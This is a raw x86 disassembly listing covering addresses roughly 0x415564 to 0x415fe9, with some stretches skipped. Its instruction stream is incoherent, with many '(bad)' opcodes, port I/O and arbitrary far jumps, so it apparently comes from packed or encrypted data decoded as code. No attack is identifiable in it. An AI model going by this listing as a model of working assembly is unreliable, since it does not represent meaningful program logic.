  415564:	mov    bl,0x76
  415566:	mov    al,0x3d
  415568:	sbb    BYTE PTR [ecx+ecx*2],bl
  41556b:	xor    eax,0xa67f
	...
  4155d4:	add    BYTE PTR [eax],al
  4155d6:	in     al,0xf0
  4155d8:	sub    DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x415564
  4155e3:	cmc    
  4155e4:	popa   
  4155e5:	mov    al,ds:0xe667
  4155ea:	add    BYTE PTR [ecx],al
  4155ec:	add    BYTE PTR [eax],al
  4155ee:	mov    eax,0x23d51976
  4155f3:	xchg   ecx,eax
  4155f4:	and    eax,0x9a29968
  4155f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155fa:	adc    edi,DWORD PTR fs:[eax-0x467768f2]
  415601:	sub    dl,dl
  415603:	add    BYTE PTR [esi],dh
  415605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415606:	xchg   esp,eax
  415607:	jne    0x415611
  415609:	inc    edi
  41560a:	pop    ebx
  41560b:	ins    DWORD PTR es:[edi],dx
  41560c:	jb     0x4155e6
  41560e:	sbb    BYTE PTR [eax-0x30dbce20],0x81
  415615:	scas   al,BYTE PTR es:[edi]
  415616:	mov    dh,0x82
  415618:	mov    esi,DWORD PTR [esi-0x3f156e9]
  41561e:	xor    ebx,DWORD PTR [ebx]
  415620:	sbb    al,0xf6
  415622:	mov    dh,0x55
  415624:	call   0xcebc4b54
  415629:	loopne 0x41568b
  41562b:	and    al,0x5e
  41562d:	cmp    esi,DWORD PTR [ebx-0x3535dc1e]
  415633:	repz imul cl
  415636:	ins    DWORD PTR es:[edi],dx
  415637:	loop   0x4155c9
  415639:	out    0x7a,al
  41563b:	dec    ebp
  41563c:	sar    edx,0x86
  41563f:	aaa    
  415640:	and    al,0xcb
  415642:	lods   al,BYTE PTR ds:[esi]
  415643:	or     BYTE PTR [ebp-0x45],dl
  415646:	dec    esp
  415647:	dec    DWORD PTR [esi-0xd]
  41564a:	ins    BYTE PTR es:[edi],dx
  41564b:	popa   
  41564c:	cmp    ecx,DWORD PTR [ebx+ebp*4+0x1]
  415650:	jle    0x4155ed
  415652:	or     BYTE PTR [ecx-0x1a],ch
  415655:	add    al,0xc
  415657:	mov    al,0x51
  415659:	dec    edx
  41565a:	pop    es
  41565b:	stos   BYTE PTR es:[edi],al
  41565c:	das    
  41565d:	jmp    0xf350eb75
  415662:	push   ecx
  415663:	push   bp
  415665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415667:	xchg   di,ax
  415669:	jl     0x41564f
  41566b:	(bad)  
  41566c:	cwde   
  41566d:	dec    ebp
  41566e:	fisttp WORD PTR [edx+0x35]
  415671:	push   sp
  415673:	push   edi
  415674:	(bad)  
  415676:	pop    ds
  415677:	push   0xffffff83
  415679:	cmp    al,0xdc
  41567b:	imul   BYTE PTR [esi+0x7f]
  41567e:	mov    WORD PTR [esi-0x31],ds
  415681:	les    esi,FWORD PTR [eax+0x775a6cb2]
  415687:	mov    cl,0xab
  415689:	xchg   ecx,eax
  41568a:	sbb    ch,BYTE PTR [ebp+0x79]
  41568d:	cli    
  41568e:	fstp   QWORD PTR [eax+edx*2-0x67]
  415692:	shl    BYTE PTR [ecx],cl
  415694:	fsubr  st,st(5)
  415696:	sub    eax,0xdbd436fa
  41569b:	test   BYTE PTR [ecx],al
  41569d:	sbb    bl,BYTE PTR [ecx]
  41569f:	push   ecx
  4156a0:	and    al,0x4f
  4156a2:	mov    DWORD PTR [esi+0x697147c9],esp
  4156a8:	icebp  
  4156a9:	sub    eax,DWORD PTR [esi+edi*1-0x6b]
  4156ad:	jmp    0xc4bc4d8
  4156b2:	in     al,0x67
  4156b4:	pop    ecx
  4156b5:	ins    BYTE PTR es:[edi],dx
  4156b6:	call   0x7cb3:0x55f6317d
  4156bd:	sbb    al,0x67
  4156bf:	nop
  4156c0:	mov    eax,ds:0xa42cf8dc
  4156c5:	sbb    esp,DWORD PTR [ebx+eax*1]
  4156c8:	jp     0x41566d
  4156ca:	addr16 rol ebx,1
  4156cd:	sub    DWORD PTR [eax+0x4c7c472e],ebx
  4156d3:	pop    ebp
  4156d4:	push   0xafca0441
  4156d9:	sbb    DWORD PTR [eax+0x74],0x4d73489c
  4156e0:	and    DWORD PTR [eax+0xffcf592],eax
  4156e6:	call   0x5489e16d
  4156eb:	xor    BYTE PTR [edi+0xe7],0x0
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x7d
  415763:	pushf  
  415764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415765:	mov    al,0x67
  415767:	out    0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    ah,cl
  41576f:	lea    ecx,[ebx-0x5fb86240]
  415775:	mov    ah,ch
  415777:	adc    dl,dl
  415779:	loopne 0x415767
  41577b:	mul    DWORD PTR [ecx+eiz*8-0x70]
  41577f:	fcomp  QWORD PTR [ebx+esi*4-0x4ce57d9b]
  415786:	jp     0x41576b
  415788:	adc    edi,DWORD PTR [ebx]
  41578a:	loop   0x4157ff
  41578c:	xor    al,0x92
  41578e:	cmp    eax,0x22505a3e
  415793:	ds inc edi
  415795:	nop
  415796:	loopne 0x415771
  415798:	sub    DWORD PTR [eax+0x44],0x6
  41579c:	push   cs
  41579d:	inc    ebx
  41579e:	loopne 0x41575a
  4157a0:	korb   k3,k6,k7
  4157a4:	mov    eax,ds:0xfef7ce9d
  4157a9:	xchg   ebx,eax
  4157aa:	push   0x6268145
  4157af:	inc    ebx
  4157b0:	rol    DWORD PTR [edx],0xe2
  4157b3:	(bad)  
  4157b4:	repz pop edx
  4157b6:	mov    esi,0xdf6dc32c
  4157bb:	xor    eax,0xdbf90ef5
  4157c0:	lods   al,BYTE PTR ds:[esi]
  4157c1:	cwde   
  4157c2:	push   eax
  4157c3:	push   edx
  4157c4:	mov    dl,dh
  4157c6:	push   cs
  4157c7:	cmp    DWORD PTR [ebp+0xed72d89],ebx
  4157cd:	jl     0x415791
  4157cf:	ds test al,0x84
  4157d2:	sar    BYTE PTR [edi],cl
  4157d4:	mov    edx,0x7353abe1
  4157d9:	inc    ebx
  4157da:	int3   
  4157db:	icebp  
  4157dc:	int3   
  4157dd:	pop    es
  4157de:	inc    eax
  4157df:	inc    esi
  4157e0:	xlat   BYTE PTR ds:[ebx]
  4157e1:	xlat   BYTE PTR ds:[ebx]
  4157e2:	sub    BYTE PTR [edx-0x6d5b4988],bh
  4157e8:	or     DWORD PTR [eax-0x63a272ca],esp
  4157ee:	repz jge 0x415831
  4157f1:	and    DWORD PTR [esi],edi
  4157f3:	(bad)
  4157f7:	jnp    0x415806
  4157f9:	inc    esp
  4157fa:	(bad)  
  4157fb:	mov    ecx,0x785e2db7
  415800:	scas   eax,DWORD PTR es:[edi]
  415801:	ins    BYTE PTR es:[edi],dx
  415802:	mov    ds:0x6f67f9cb,eax
  415807:	or     BYTE PTR [ecx-0x3e2cfc43],al
  41580d:	lahf   
  41580e:	(bad)  
  41580f:	clc    
  415810:	inc    edi
  415811:	outs   dx,DWORD PTR ds:[esi]
  415812:	daa    
  415813:	stc    
  415814:	(bad)  
  415815:	mov    cl,0xda
  415817:	mov    ebx,0xbae38cb9
  41581c:	popf   
  41581d:	adc    ecx,esp
  41581f:	mov    dl,0x7f
  415821:	mov    ebp,0xfd6b0789
  415826:	in     al,0x81
  415828:	mov    DWORD PTR [esi],ebp
  41582a:	outs   dx,BYTE PTR ds:[esi]
  41582b:	out    0x60,al
  41582d:	adc    al,0x2f
  41582f:	jl     0x415818
  415831:	lods   al,BYTE PTR ds:[esi]
  415832:	lods   eax,DWORD PTR ds:[esi]
  415833:	pop    ebx
  415834:	cld    
  415835:	ror    BYTE PTR [ebx+eax*2],cl
  415838:	hlt    
  415839:	sbb    al,0x44
  41583b:	push   0x5d
  41583d:	hlt    
  41583e:	loope  0x4157ed
  415840:	adc    al,0x88
  415842:	xor    eax,0x480d84a2
  415847:	mov    bl,0xe7
  415849:	jge    0x41581f
  41584b:	imul   esi,DWORD PTR [eax-0x5469c809],0xd4ee799
  415855:	add    ecx,eax
  415857:	jns    0x415836
  415859:	xchg   ecx,eax
  41585a:	cmc    
  41585b:	mov    dh,0xa9
  41585d:	and    edi,DWORD PTR [eax+0x55]
  415860:	mov    ah,0x71
  415862:	std    
  415863:	jge    0x4158a7
  415865:	call   0xb49:0xce09181b
  41586c:	loopne 0x41581c
	...
  4158d6:	retf   
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	shr    ebp,cl
  4158e3:	shl    edi,cl
  4158e5:	sub    esp,DWORD PTR [edi-0x18]
  4158e8:	add    BYTE PTR [eax],al
  4158ea:	add    BYTE PTR [ecx],al
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	mov    ?,WORD PTR [ecx+0x772b59e6]
  4158f4:	add    DWORD PTR [edi+0x29],0x5dd11cc8
  4158fb:	or     ebx,ebp
  4158fd:	cdq    
  4158fe:	ret    0xbe28
  415901:	sbb    BYTE PTR [eax],0x5a
  415904:	pop    edx
  415905:	xchg   ebp,eax
  415906:	test   BYTE PTR [ebp-0xcaeb801],0x3a
  41590d:	mov    esi,0xf8b2e200
  415912:	mov    WORD PTR [edi],gs
  415914:	and    ebp,DWORD PTR [ecx]
  415916:	popf   
  415917:	mov    DWORD PTR [ebp-0xe],ebp
  41591a:	fisttp WORD PTR [esi]
  41591c:	sbb    al,0xd1
  41591e:	sbb    eax,0x177b1c27
  415923:	out    dx,al
  415924:	sahf   
  415925:	mov    ebp,es
  415927:	adc    DWORD PTR [edx-0x4b],edx
  41592a:	mov    dl,BYTE PTR [eax-0x45b1d75e]
  415930:	rep outs dx,BYTE PTR ds:[esi]
  415932:	xchg   esp,eax
  415933:	repnz pop eax
  415935:	push   esp
  415936:	xchg   edx,eax
  415937:	cld    
  415938:	in     al,0x94
  41593a:	sub    cl,bh
  41593c:	inc    ebp
  41593d:	dec    ecx
  41593e:	xor    ecx,DWORD PTR [ebx-0x77]
  415941:	(bad)
  415944:	fwait
  415945:	ret    
  415946:	js     0x41598d
  415948:	jnp    0x4159af
  41594a:	in     al,dx
  41594b:	mov    esi,0x63a03984
  415950:	data16 data16 jbe 0x41594d
  415954:	test   DWORD PTR [edi+esi*4],esp
  415957:	mov    al,0xfc
  415959:	aad    0xbf
  41595b:	mov    al,BYTE PTR [ebx+ebx*2+0x6e723e6a]
  415962:	ins    DWORD PTR es:[edi],dx
  415963:	jl     0x415989
  415965:	dec    DWORD PTR [di]
  415968:	imul   edi,DWORD PTR [ebx+ebp*4-0x7a9da3cb],0x66
  415970:	push   eax
  415971:	sbb    ah,BYTE PTR [esp+edi*8+0x75]
  415975:	clc    
  415976:	push   edi
  415977:	mov    BYTE PTR [eax+0x51930b2c],dl
  41597d:	fs mov edx,0xf3b16e94
  415983:	jnp    0x41593c
  415985:	push   ebp
  415986:	or     al,0x1a
  415988:	dec    ebp
  415989:	ds mov al,0xb2
  41598c:	xchg   esp,eax
  41598d:	sub    edi,ebp
  41598f:	adc    esi,DWORD PTR [edi-0x1f]
  415992:	add    eax,0xc8c63cc1
  415997:	test   DWORD PTR [ecx],edi
  415999:	shr    esp,1
  41599b:	lods   al,BYTE PTR ds:[esi]
  41599c:	pop    esi
  41599d:	test   BYTE PTR [ebx+0x1231b1ba],ah
  4159a3:	sub    ecx,DWORD PTR [eax-0x20]
  4159a6:	and    eax,0xcc27d0c
  4159ab:	push   es
  4159ac:	call   0x45ba:0xb87d44c5
  4159b3:	push   esp
  4159b4:	in     eax,dx
  4159b5:	jmp    0x91d4:0x2b701cac
  4159bc:	ror    esi,0x4c
  4159bf:	mov    bl,0xfd
  4159c1:	xchg   DWORD PTR [ebp+0x3f27fa37],esp
  4159c7:	ins    DWORD PTR es:[edi],dx
  4159c8:	test   eax,0x21676871
  4159cd:	cmp    bl,BYTE PTR [eax-0x6a33fcf]
  4159d3:	add    eax,0x5f2ea941
  4159d8:	out    dx,al
  4159d9:	push   es
  4159da:	dec    eax
  4159db:	adc    dh,cl
  4159dd:	and    al,0xc7
  4159df:	cld    
  4159e0:	cmp    al,0xd9
  4159e2:	mov    edi,0xa12c360e
  4159e7:	ror    DWORD PTR [edx-0x32],1
  4159ea:	nop
  4159eb:	stos   BYTE PTR es:[edi],al
  4159ec:	mov    esi,0x32
	...
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	push   ebp
  415a63:	mov    edi,esi
  415a65:	xchg   BYTE PTR [edi-0x17],ah
  415a68:	add    BYTE PTR [eax],al
  415a6a:	add    BYTE PTR [ecx],al
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	imul   esp,DWORD PTR [esi-0x6],0xffffffba
  415a72:	aas    
  415a73:	cmp    DWORD PTR [ecx+0x79],ebx
  415a76:	inc    esi
  415a77:	cmp    ebp,ebx
  415a79:	xchg   esi,eax
  415a7a:	mov    ds:0x8038af50,eax
  415a7f:	or     DWORD PTR [edx+0x48],eax
  415a82:	ret    0x185a
  415a85:	and    eax,0xf0e230ec
  415a8a:	mov    bl,0x30
  415a8c:	xor    eax,0xbc181850
  415a91:	retf   0x23a4
  415a94:	jmp    0xcf4:0x737e365b
  415a9b:	jl     0x415a4e
  415a9d:	sub    eax,0x23065bbe
  415aa2:	push   0x1eebdbea
  415aa7:	daa    
  415aa8:	jne    0x415aef
  415aaa:	pop    edi
  415aab:	fwait
  415aac:	xchg   edi,eax
  415aad:	adc    ch,al
  415aaf:	xchg   edi,eax
  415ab0:	or     ah,ch
  415ab2:	mov    dh,BYTE PTR gs:[edx]
  415ab5:	mov    esi,ds
  415ab7:	sbb    ecx,DWORD PTR [edi+0x20]
  415aba:	clc    
  415abb:	push   es
  415abc:	mov    esi,0xbbfe5498
  415ac1:	fbld   TBYTE PTR [edx]
  415ac3:	(bad)  
  415ac4:	sub    al,0x55
  415ac6:	push   es
  415ac7:	jmp    0x1337:0x9823129b
  415ace:	push   0x16c7cd84
  415ad3:	adc    al,BYTE PTR [eax-0x4b]
  415ad6:	sub    al,0xcb
  415ad8:	dec    esi
  415ad9:	and    ebp,DWORD PTR [esi-0x43]
  415adc:	dec    esp
  415add:	add    al,0xbf
  415adf:	addr16 inc ebx
  415ae1:	stc    
  415ae2:	jo     0x415af6
  415ae4:	cwde   
  415ae5:	dec    ebx
  415ae6:	stos   BYTE PTR es:[edi],al
  415ae7:	aaa    
  415ae8:	mov    ecx,0x98bf07ab
  415aed:	(bad)  
  415aee:	mov    edi,0xaffd59cb
  415af3:	sbb    dh,al
  415af5:	jns    0x415b3e
  415af7:	mov    tr5,esi
  415afa:	push   0x7b
  415afc:	sub    ebp,DWORD PTR [eax]
  415afe:	fadd   QWORD PTR [ecx+0x0]
  415b01:	(bad)  
  415b02:	retf   
  415b03:	jb     0x415b7c
  415b05:	dec    ebp
  415b06:	pushf  
  415b07:	(bad)  
  415b08:	ror    dl,1
  415b0a:	pop    edx
  415b0b:	popf   
  415b0c:	sar    DWORD PTR [edi+0x4b],1
  415b0f:	push   edx
  415b10:	mov    ecx,0xcb338d69
  415b15:	sub    ch,BYTE PTR [ebx]
  415b17:	mov    esp,0x98ae0092
  415b1c:	sub    cl,BYTE PTR [ebp-0x13396adc]
  415b22:	push   edi
  415b23:	ret    
  415b24:	popf   
  415b25:	jle    0x415b72
  415b27:	and    dh,BYTE PTR [ebp*8-0x41e332b0]
  415b2e:	jmp    0x415b90
  415b30:	fistp  WORD PTR [eax]
  415b32:	sub    edx,DWORD PTR [eax+0x5743f99]
  415b38:	jmp    DWORD PTR ss:[esi-0x5d]
  415b3c:	retf   0x5234
  415b3f:	sbb    DWORD PTR [edx],0x1c
  415b42:	dec    edx
  415b43:	cli    
  415b44:	mov    esp,0x86e2de61
  415b49:	fwait
  415b4a:	aad    0x9d
  415b4c:	dec    ecx
  415b4d:	arpl   si,si
  415b4f:	and    DWORD PTR [esi+0x2b66a2b8],ebp
  415b55:	aad    0x3f
  415b57:	lea    ecx,[ecx]
  415b59:	adc    BYTE PTR ds:0x70465a24,ah
  415b5f:	pop    esp
  415b60:	adc    BYTE PTR [ecx+eax*8+0x6c887cf7],bl
  415b67:	test   DWORD PTR [esi-0xca25797],edx
  415b6d:	out    dx,al
	...
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fsubr  st(7),st
  415be3:	nop
  415be4:	xor    ebp,DWORD PTR [edi]
  415be6:	addr16 jmp 0x0:0x1000000
  415bee:	loopne 0x415c2f
  415bf0:	cdq    
  415bf1:	ins    DWORD PTR es:[edi],dx
  415bf2:	(bad)  
  415bf3:	sbb    eax,eax
  415bf5:	es pop ss
  415bf7:	and    esp,edi
  415bf9:	xor    BYTE PTR [eax+0x2e],bh
  415bfc:	cmp    BYTE PTR [ecx],0x18
  415bff:	sbb    ah,BYTE PTR [esp+ecx*4+0x174cede7]
  415c06:	jbe    0x415bb7
  415c08:	adc    al,0x5d
  415c0a:	shl    BYTE PTR [ebp+esi*1-0x77f794b2],cl
  415c11:	nop
  415c12:	adc    BYTE PTR [ebx+0x154bbaf6],0x32
  415c19:	loopne 0x415bf2
  415c1b:	add    DWORD PTR [eax-0x72],ebp
  415c1e:	xchg   esp,eax
  415c1f:	push   ebx
  415c20:	aam    0xb3
  415c22:	retf   0xfd4a
  415c25:	imul   eax,DWORD PTR [edi],0x5f
  415c28:	sbb    eax,0xc3904359
  415c2d:	mov    ecx,0xc86ec077
  415c32:	add    dh,0x40
  415c35:	xchg   ebx,eax
  415c36:	jmp    0x415c59
  415c38:	gs ja  0x3dba51c9
  415c3f:	dec    esp
  415c40:	xchg   BYTE PTR [edx-0x3c],al
  415c43:	ret    0xf30e
  415c46:	and    al,0xb5
  415c48:	imul   edx,DWORD PTR [ecx-0x37ad2132],0xb39defa7
  415c52:	int    0xca
  415c54:	outs   dx,DWORD PTR ds:[esi]
  415c55:	cmp    esi,ebx
  415c57:	mov    al,0x58
  415c59:	mov    ah,0xb0
  415c5b:	jb     0x415cc4
  415c5d:	adc    BYTE PTR [esi+esi*8],cl
  415c60:	jae    0x415ce0
  415c62:	push   edi
  415c63:	push   ecx
  415c64:	xchg   BYTE PTR [ebx+0x3d],bh
  415c67:	addr16 (bad) 
  415c69:	jmp    0x415c78
  415c6b:	jns    0x415bf0
  415c6d:	iret   
  415c6e:	ret    0xc55e
  415c71:	sub    BYTE PTR [ecx+0x5f],al
  415c74:	pop    ss
  415c75:	cli    
  415c76:	sahf   
  415c77:	pop    es
  415c78:	rcl    DWORD PTR [eax-0x421e3e0e],cl
  415c7e:	call   0xeae6953d
  415c83:	pop    ss
  415c84:	je     0x415c47
  415c86:	jp     0x415c9e
  415c88:	adc    BYTE PTR [ebx-0x6c],dl
  415c8b:	sbb    al,0x4b
  415c8d:	jae    0x415cd8
  415c8f:	xchg   edx,ebx
  415c91:	or     BYTE PTR [ecx-0x30],dh
  415c94:	push   edx
  415c95:	dec    eax
  415c96:	rol    DWORD PTR [esi+edi*4-0x5504ddd4],cl
  415c9d:	or     BYTE PTR [edx-0x779af80a],al
  415ca3:	pop    esp
  415ca4:	cwde   
  415ca5:	ja     0x415c4c
  415ca7:	dec    ebx
  415ca8:	(bad)  
  415ca9:	rcr    DWORD PTR [ecx+eiz*1-0x4dfbad3a],1
  415cb0:	sar    DWORD PTR es:[edx],0x5a
  415cb4:	imul   edx,DWORD PTR [edi],0x1fc61dcc
  415cba:	in     eax,0x62
  415cbc:	fstp   QWORD PTR [esi+eiz*1+0x5d621b1a]
  415cc3:	or     BYTE PTR [edi],0x89
  415cc6:	sbb    al,dl
  415cc8:	les    ecx,FWORD PTR [edx+0x391a1eba]
  415cce:	sub    dl,cl
  415cd0:	push   edi
  415cd1:	nop
  415cd2:	sub    DWORD PTR [eax+0x6],0xffffff83
  415cd6:	dec    eax
  415cd7:	div    ecx
  415cd9:	leave  
  415cda:	std    
  415cdb:	mov    WORD PTR [eax],?
  415cdd:	xchg   ebp,eax
  415cde:	jb     0x415cf1
  415ce0:	mov    ch,0x5
  415ce2:	mov    ecx,0x6784d345
  415ce7:	dec    ebp
  415ce8:	mov    esi,0x960f1d96
  415ced:	add    BYTE PTR cs:[eax],al
	...
  415d54:	add    BYTE PTR [eax],al
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x7562ed1f
  415d65:	adc    al,0x67
  415d67:	jmp    0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [eax],ch
  415d6f:	pusha  
  415d70:	pop    edi
  415d71:	sbb    eax,0xbd55e8ce
  415d76:	cli    
  415d77:	retf   0xbc3f
  415d7a:	mov    DWORD PTR [eax-0x5b],ebp
  415d7d:	adc    bl,BYTE PTR [edi-0x7eaebf34]
  415d83:	sub    al,dl
  415d85:	outs   dx,DWORD PTR ds:[esi]
  415d86:	inc    edi
  415d87:	or     al,cl
  415d89:	scas   al,BYTE PTR es:[edi]
  415d8a:	push   0xfffffffa
  415d8c:	push   edi
  415d8d:	fidiv  WORD PTR [ebp-0x47e67787]
  415d93:	xor    al,0xbb
  415d95:	jno    0x415d1d
  415d97:	cmp    esi,edx
  415d99:	in     al,0x2c
  415d9b:	xchg   ebp,eax
  415d9c:	dec    edx
  415d9d:	xchg   ecx,eax
  415d9e:	cmp    ch,BYTE PTR [eax-0x5f6f5e28]
  415da4:	sub    BYTE PTR [ebp-0x2d],bl
  415da7:	pop    esi
  415da8:	pause  
  415daa:	cmp    al,0xd3
  415dac:	outs   dx,BYTE PTR ds:[esi]
  415dad:	test   eax,0x232c7420
  415db2:	adc    ecx,DWORD PTR [eax+0x22ba4cb0]
  415db8:	xor    dl,dh
  415dba:	xchg   esp,eax
  415dbb:	rcr    ch,0x8e
  415dbe:	mov    ebp,0x467cb4a2
  415dc3:	adc    DWORD PTR [edi-0x13],ebp
  415dc6:	in     eax,dx
  415dc7:	rcl    ebx,1
  415dc9:	(bad)
  415dcc:	pop    edx
  415dcd:	test   eax,0xa192689e
  415dd2:	xor    cl,BYTE PTR [esp+esi*4+0x2e]
  415dd6:	mov    edx,gs
  415dd8:	xor    DWORD PTR [esi],ebx
  415dda:	mov    ch,0x79
  415ddc:	pop    eax
  415ddd:	sub    DWORD PTR [ebp+0x17abdd4],edx
  415de3:	inc    esp
  415de4:	mov    ebx,0x2ccaa972
  415de9:	sub    BYTE PTR [esi+0x33],dh
  415dec:	leave  
  415ded:	jnp    0x415de6
  415def:	leave  
  415df0:	mov    edi,DWORD PTR [edx]
  415df2:	xchg   esi,eax
  415df3:	(bad)  
  415df4:	cdq    
  415df5:	add    dl,BYTE PTR [ebx+0x127c4d62]
  415dfb:	nop
  415dfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dfd:	nop
  415dfe:	imul   esp,DWORD PTR [ebp-0x7e],0x4cc4c62c
  415e05:	xchg   esp,eax
  415e06:	pop    ss
  415e07:	push   ecx
  415e08:	and    BYTE PTR [esi-0x33c0914],dl
  415e0e:	sbb    eax,0xa1ee9649
  415e13:	push   ss
  415e14:	cwde   
  415e15:	or     eax,0xb14fd047
  415e1a:	aam    0x23
  415e1c:	cmp    eax,esi
  415e1e:	lock xchg esp,eax
  415e20:	into   
  415e21:	je     0x415e3d
  415e23:	pop    ss
  415e24:	and    BYTE PTR ds:0x8a32eef3,ch
  415e2a:	scas   eax,DWORD PTR es:[edi]
  415e2b:	and    esi,DWORD PTR [edi]
  415e2d:	jmp    0x415e44
  415e2f:	in     eax,dx
  415e30:	pop    ecx
  415e31:	sti    
  415e32:	or     bh,BYTE PTR [eax+0x40]
  415e35:	enter  0x908,0x4f
  415e39:	or     DWORD PTR [edi+ebp*8-0x70d49b2d],ebp
  415e40:	ss jecxz 0x415e10
  415e43:	push   ds
  415e44:	inc    ecx
  415e45:	iret   
  415e46:	cs scas al,BYTE PTR es:[edi]
  415e48:	push   ebp
  415e49:	mov    ebx,0x1afd2d5a
  415e4e:	outs   dx,DWORD PTR ds:[esi]
  415e4f:	jg     0x415e51
  415e51:	add    BYTE PTR [edi],dh
  415e53:	mov    esp,0xff28e191
  415e58:	push   ebx
  415e59:	mov    edi,0x83839b29
  415e5e:	ins    BYTE PTR es:[edi],dx
  415e5f:	call   0xf1a0bb7e
  415e64:	mov    eax,0x1f9b1b33
  415e69:	aam    0x3c
  415e6b:	xor    ah,BYTE PTR ds:0xee
	...
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax+0x15]
  415ee3:	mov    BYTE PTR [eax+0xec67a5],dh
  415ee9:	add    BYTE PTR [eax],al
  415eeb:	add    DWORD PTR [eax],eax
  415eed:	add    BYTE PTR [ebx+eiz*4],al
  415ef0:	and    eax,0xbd2b1b5b
  415ef5:	call   0xb769:0x861c0be8
  415efc:	xor    BYTE PTR [eax-0x56],ah
  415eff:	std    
  415f00:	mov    ch,0x4d
  415f02:	loope  0x415e9b
  415f04:	ror    dh,1
  415f06:	adc    BYTE PTR [esi+0x299b7802],cl
  415f0c:	adc    BYTE PTR ss:[eax-0x4b],dh
  415f10:	scas   al,BYTE PTR es:[edi]
  415f11:	js     0x415f77
  415f13:	stos   BYTE PTR es:[edi],al
  415f14:	(bad)  
  415f15:	imul   esp,DWORD PTR [eax],0xffffff89
  415f18:	arpl   WORD PTR [ebp-0x20a85aa5],sp
  415f1e:	xchg   ebx,eax
  415f1f:	or     eax,0xac5875d7
  415f24:	xor    al,0x12
  415f26:	push   esi
  415f27:	(bad)  
  415f28:	xor    bh,bh
  415f2a:	dec    ebx
  415f2b:	fisub  DWORD PTR [ebx]
  415f2d:	mov    eax,ds:0x390cbea
  415f32:	hlt    
  415f33:	add    eax,0x20e9afa8
  415f38:	mov    WORD PTR [esi+eax*8+0xf],cs
  415f3c:	push   0x7f
  415f3e:	popf   
  415f3f:	pop    ebx
  415f40:	test   eax,0xfe10c898
  415f45:	pop    ebp
  415f46:	fidiv  WORD PTR [esi]
  415f48:	outs   dx,BYTE PTR ds:[esi]
  415f49:	jns    0x415f4f
  415f4b:	xchg   ecx,eax
  415f4c:	ja     0x415f3c
  415f4e:	cld    
  415f4f:	ret    
  415f50:	xor    al,0x57
  415f52:	outs   dx,BYTE PTR ds:[esi]
  415f53:	cwde   
  415f54:	fimul  DWORD PTR [edi-0x1f]
  415f57:	pusha  
  415f58:	xor    BYTE PTR [ebx-0x43],0x5e
  415f5c:	mov    eax,0xd88d8354
  415f61:	sbb    al,0x28
  415f63:	sub    al,0xf
  415f65:	fs fs pop ebp
  415f68:	jo     0x415f24
  415f6a:	dec    edi
  415f6b:	xchg   edx,eax
  415f6c:	push   ss
  415f6d:	jge    0x415fd1
  415f6f:	xor    eax,0xcab8b87
  415f74:	test   BYTE PTR [ebp-0x64],cl
  415f77:	daa    
  415f78:	in     eax,0x4f
  415f7a:	bound  esp,QWORD PTR [edx+0x49]
  415f7d:	dec    eax
  415f7e:	sti    
  415f7f:	add    al,0x78
  415f81:	adc    eax,0x113bdf02
  415f86:	in     eax,0xa5
  415f88:	jge    0x415f2b
  415f8a:	in     eax,0xcc
  415f8c:	out    0x57,eax
  415f8e:	add    al,0x33
  415f90:	or     dh,BYTE PTR [eax+0x74f8a228]
  415f96:	sub    bl,BYTE PTR [eax]
  415f98:	mov    bl,0xb0
  415f9a:	and    esi,edi
  415f9c:	mov    al,ds:0x5e082bbe
  415fa1:	aad    0x31
  415fa3:	dec    eax
  415fa4:	pop    edi
  415fa5:	test   al,0x12
  415fa7:	in     al,dx
  415fa8:	stos   BYTE PTR es:[edi],al
  415fa9:	sahf   
  415faa:	ret    
  415fab:	fwait
  415fac:	out    dx,eax
  415fad:	clc    
  415fae:	dec    esp
  415faf:	push   cs
  415fb0:	jne    0x415f89
  415fb2:	adc    eax,0x49a912f5
  415fb7:	and    ebp,DWORD PTR [edi-0x46]
  415fba:	xchg   esp,eax
  415fbb:	inc    esi
  415fbc:	push   esp
  415fbd:	clc    
  415fbe:	jecxz  0x416034
  415fc0:	ret    0x9aaa
  415fc3:	hlt    
  415fc4:	call   0xbfe2:0x6f145a8e
  415fcb:	jnp    0x415f9d
  415fcd:	das    
  415fce:	and    esi,eax
  415fd0:	push   esi
  415fd1:	xchg   edi,eax
  415fd2:	push   esi
  415fd3:	bound  ebx,QWORD PTR [edi+0x3c]
  415fd6:	pop    esp
  415fd7:	aad    0x38
  415fd9:	sti    
  415fda:	cmp    edi,esi
  415fdc:	adc    al,0x1f
  415fde:	int3   
  415fdf:	and    ebx,0xffffffea
  415fe2:	jg     0x415f73
  415fe4:	mov    edi,ebp
  415fe6:	lds    ebx,FWORD PTR [ebx+0x12]
  415fe9:	imul   ebx,DWORD PTR [ecx+edx*2],0x98e8
	...
